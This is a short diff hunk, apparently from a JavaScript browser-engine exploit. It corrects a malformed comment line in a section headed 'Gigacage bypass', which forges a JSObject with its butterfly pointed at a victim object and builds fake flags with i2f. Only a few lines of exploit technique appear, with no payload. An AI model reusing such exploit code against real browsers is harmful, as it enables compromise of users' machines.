@@ -588,7 +588,7 @@ function unbox_double(d) {
 
     // Gigacage bypass: Forge a JSObject which has its butterfly pointing
     // to victim
-    /:u32[0] = 0x200;
+    //u32[0] = 0x200;
     //u32[1] = 0x01082307 - 0x20000;
     var flags_double = i2f(0x0108230700000000);
 
